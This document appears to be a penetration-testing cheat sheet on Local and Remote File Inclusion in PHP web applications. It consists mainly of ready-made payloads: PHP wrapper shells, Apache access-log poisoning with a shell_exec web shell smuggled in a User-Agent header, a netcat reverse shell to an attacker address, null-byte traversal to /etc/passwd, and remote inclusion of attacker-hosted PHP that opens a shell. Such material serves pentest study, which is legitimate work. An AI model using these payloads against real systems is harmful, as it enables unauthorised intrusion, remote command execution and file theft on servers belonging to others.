---
description: Local File Inclusion (LFI)
---

# Local File Inclusion

> The Local File Inclusion vulnerability allows an attacker to read a file from the vulnerable server (Directory Traversal), which occurs due to a programming error on the page. This vulnerability can lead the attacker to: RCE, XSS, DOS...

### Identifying Local File Inclusion

Since LFI occurs when paths passed to include statements are not properly sanitized, we should look for scripts which take filenames as parameters.

```
.php?file=$FILE
.jsp?item=$FILE
```

### Exploiting Local File Inclusion

Once identified a Directory Traversal vulnerability, we can try RCE using various techniques.

#### LFI using Wrappers

PHP provides protocol ["wrappers"](https://www.php.net/manual/en/wrappers.php) that we can use to exploit Directory Traversal or LFI vulnerabilities.

```bash
.php?file=expect://whoami

.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>

.php?page=data:text/plain;,<?php echo shell_exec("whoami");?>
```

#### LFI Apache Poisoning Logs (RCE)

#### 1. Identifying Access log location

In order to execute this type of attack, it's crucial to identify the OS of the web server or the access log file location. Common Apache access file locations are:

* **RHEL/Red Hat/CentOS/Fedora Linux :** /var/log/httpd/access\_log
* **FreeBSD Apache access log file location:** /var/log/httpd-access.log
* **Debian/Ubuntu Linux:** /var/log/apache2/access.log
* **Windows:** c:\xampp\apache\logs\access.log

#### 2. Adding code in the log file

We can use nc or Burpsuite to create an invalid request that will be saved in the log file containing our payload:

{% code overflow="wrap" %}
```bash
#Connect to the server using Netcat and execute a bad request:
<?php echo '<pre>' . shell_exec($_GET['cmd']) . </pre>;?>
#Using Burpsuide, change User-Agent header like (insert in the middle):
User-Agent: Mozilla/5.0 <?php echo '<pre>' . shell_exec($_GET['cmd']) . </pre>;?> Gecko/210001310314 Firefox.....
```
{% endcode %}

#### 3. RCE

Once the payload is in the log file it's time to search the file using the Directory Traversal vulnerability to find the log file and set a value to the "cmd" parameter which will execute system commands:

```bash
#Execute system commands (change $SYSTEMCOMMAND):
.php?file=c:\xampp\apache\logs\access.log&cmd=$SYSTEMCOMMAND
#Reverse shell using netcat:
.php?file=c:\xampp\apache\logs\access.log&cmd=nc.exe -e cmd.exe $IPADDRESS $PORT
```

**Null Byte injection**

If the source codes appends the extension at the end of the code, simply put a null byte at the end to bypass it.

```bash
#Code:
include $_REQUEST["page"] + .html

#Payload:
?page=../../../../etc/passwd%00
```

## Remote File Inclusion

Same as LFI but referencing external scripts:

{% code overflow="wrap" %}
```bash
#Example:
.php?file=http://$IPADDRESS/$FILE.txt
#Content of $FILE can be (make the file with .txt extension but containing the php code inside):
<?php echo shell_exec("nc.exe $IPADDRESS $PORT -e cmd.exe") ?>
<?php echo shell_exec($_GET['cmd']) ?>
```
{% endcode %}

#### RCE

```bash
.php?file=http://$IPADDRESS/$FILE.txt&cmd=$COMMAND
```

## Bypass file extensions

If there is a server side adding extensions to files (like .php), we can try to use Null byte (%00) or question mark (?) to bypass:

```bash
.php?file=http://$IPADDRESS/$FILE.txt%00
.php?file=http://$IPADDRESS/$FILE.txt?
```

[Awakened 1712 github](https://awakened1712.github.io/oscp/oscp-lfi-rfi/)
